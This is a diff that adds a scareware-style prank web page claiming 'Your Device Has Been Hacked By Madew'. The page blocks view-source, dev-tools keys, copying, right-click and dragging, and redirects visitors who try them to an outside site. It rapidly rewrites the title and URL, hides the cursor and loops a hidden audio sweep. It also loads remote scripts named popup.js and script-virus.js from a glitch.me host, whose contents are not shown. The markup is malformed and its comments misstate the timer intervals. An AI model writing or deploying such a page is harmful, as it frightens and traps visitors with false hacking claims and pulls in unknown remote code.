@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+    <script>
+        // JavaScript to change the title
+        let titles = ["Digital Thorana 2024 🌐", "Digital Thorana 2024 🖥️", "Digital Thorana 2024 🎓", "Digital Thorana 2024 🤖"];
+        let index = 0;
+
+        function changeTitle() {
+            document.title = titles[index];
+            index = (index + 1) % titles.length;
+        }
+
+        setInterval(changeTitle, 20); // Change title every 2 seconds
+    </script>
+      <script>
+        // Array of pages to cycle through
+const pages = [' 🆅🅸🅴🆆-🆂🅾🆄🆁🅲🅴-🅱🅻🅾🅲🅺🅴🅳 🤖✅🌐👾🚧⛔', ' 🆅🅸🅴🆆-🆂🅾🆄🆁🅲🅴-🅱🅻🅾🅲🅺🅴🅳 🤖✅🌐👾🚧⛔ ', '🆅🅸🅴🆆-🆂🅾🆄🆁🅲🅴-🅱🅻🅾🅲🅺🅴🅳 🤖✅🌐👾🚧⛔', '🆅🅸🅴🆆-🆂🅾🆄🆁🅲🅴-🅱🅻🅾🅲🅺🅴🅳 🤖✅🌐👾🚧⛔'];
+        let currentIndex = 0;
+
+        function changeURL() {
+            // Get the next page from the array
+            const nextPage = pages[currentIndex];
+
+            // Change the URL without reloading the page
+            history.pushState(null, '', nextPage);
+
+            // Update the displayed current page
+            document.getElementById('currentPage').innerText = 'Current Page: ' + nextPage;
+
+            // Update the index for the next change
+            currentIndex = (currentIndex + 1) % pages.length;
+        }
+
+        // Change the URL every 3 seconds
+        setInterval(changeURL,  100);
+
+        // Optional: Handling the back/forward buttons
+        window.onpopstate = function(event) {
+            // This will handle the URL changes via back/forward buttons
+            document.getElementById('currentPage').innerText = 'Current Page: ' + location.pathname.replace('/', '');
+        };
+    </script>
+
+<script>
+        function handleKeyCommands(event) {
+            // Block and redirect for specific keys or combinations
+            if ((event.ctrlKey && event.key === 'u') ||  // Ctrl+U
+                (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'i')) ||  // Ctrl+Shift+I
+                event.key === 'F11' ||  // F11
+                event.key === 'U' ||  // U
+                event.key === 'F12' ||  // F12
+                event.key === 'PrintScreen') {  // Print Screen
+                event.preventDefault();
+                console.warn('Attempted to use blocked keys: ', event.key);
+                redirectToNewPage();
+                return false;
+            }
+
+            // Block and warn for copying source code attempts without text selection
+            if ((event.ctrlKey || event.metaKey) && event.key === 'c' && window.getSelection().toString().length === 0) {
+                console.warn('Attempted to copy without selection');
+                redirectToNewPage();
+                return false;
+            }
+        }
+
+        function redirectToNewPage() {
+            window.location.href = '/enemy.html';
+        }
+
+        document.addEventListener('keydown', handleKeyCommands);
+    </script>
+<body oncontextmenu="return false;">
+  
+<html lang="en">
+<body>
+  <head>
+<style>
+    body {
+      background-color: green;
+      font-family: Arial, sans-serif;
+      font-size: 20px;
+      margin: 0;
+      padding: 0;
+    }
+audio {
+  display: none;
+}
+#div-text {
+position: absolute;
+bottom: 0;
+right: 0;
+}
+/*script-virus*/ 
+    * {
+  cursor: hide;
+}
+#followingImage {
+position: absolute; 
+top: 0;
+left: 0;
+z-index: 1000; 
+  cursor: none;
+}
+</style>
+     <style>
+  /* Prevent text selection for better security */
+  body {
+    -webkit-user-select: none; /* Safari */
+    -moz-user-select: none;    /* Firefox */
+    -ms-user-select: none;     /* IE10+/Edge */
+    user-select: none;         /* Standard */
+  }
+</style>
+<script>
+  // Disable right-click as soon as the script is parsed
+  (function() {
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    }, { capture: true });
+  })();
+</script>
+
+<style>
+    /* Disable dragging for all elements */
+    * {
+        user-drag: none;
+        -webkit-user-drag: none; /* For Safari */
+    }
+
+    /* Optionally, allow dragging for specific elements */
+    .allow-drag {
+        user-drag: auto;
+        -webkit-user-drag: auto; /* For Safari */
+    }
+</style>
+</head>
+<body>
+    
+    <!-- Example elements -->
+    <div id="element1"></div>
+    <div id="element2" class="allow-drag"></div>
+</body>
+    <script>
+        function handleKeyCommands(event) {
+            // Block and redirect for specific keys or combinations
+            if ((event.ctrlKey && event.key === 'u') ||  // Ctrl+U
+                (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'i')) ||  // Ctrl+Shift+I
+                event.key === 'F11' ||  // F11
+                event.key === 'F12' ||  // F12
+                event.key === 'PrintScreen') {  // Print Screen
+                event.preventDefault();
+                console.warn('Attempted to use blocked keys: ', event.key);
+                redirectToNewPage();
+                return false;
+            }
+
+            // Block and warn for copying source code attempts without text selection
+            if ((event.ctrlKey || event.metaKey) && event.key === 'c' && window.getSelection().toString().length === 0) {
+                console.warn('Attempted to copy without selection');
+                redirectToNewPage();
+                return false;
+            }
+        }
+
+        function redirectToNewPage() {
+            window.location.href = 'https://madew-virus.glitch.me/';
+        }
+
+        document.addEventListener('keydown', handleKeyCommands);
+    </script>
+
+<link rel="shortcut icon" type="image/png" href="https://hisarhospital.com/wp-content/uploads/2013/02/corona_virüs.png"/>
+<title>Are You Kidding Me HAAH</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<audio controls loop>
+  <source src="https://cdn.glitch.global/bf0458f0-8a69-4da2-8519-3175bcef27c6/yt1s.com%20-%20Hearing%20Test%20%2020%20Hz%20to%2020%20kHz%20Frequency%20Sweep.mp3?v=1717412895100" type="audio/mpeg">
+</audio>
+<center>
+  <h1>Your Device Has Been Hacked By Madew</h1>
+  <h2>Bitch/Dog.GLITCH.ME</h2>
+  <img src="https://cdn.glitch.global/e2300227-163f-40cc-b7d5-7af03f056e1a/icegif-1075-imageonline.co-1445321.gif?v=1717430493254" alt="HAHAHAHAHAHHHHH">
+</center>
+<div id="div-text">
+  <p>Pop-Up.JS.SiteVirus</p>
+</div>
+<img id="followingImage" src="https://cdn.glitch.global/0b7242e4-ca2b-4f78-b9a3-60d6c824dfd4/mouse.png?v=1716208094944" alt="Mouse Following Image" width="50" height="50">
+<script type="text/javascript" language="JavaScript" src="https://madew-virus.glitch.me/normalcodes.js"></script>
+<script type="text/javascript" language="JavaScript" src="https://madew-virus.glitch.me/popup.js"></script>
+<script type="text/javascript" language="JavaScript" src="https://madew-virus.glitch.me/sound.js"></script>
+<script type="text/javascript" language="JavaScript" src="https://madew-virus.glitch.me/script-virus.js"></script>
+  </head>
+  </body>
+</html> 
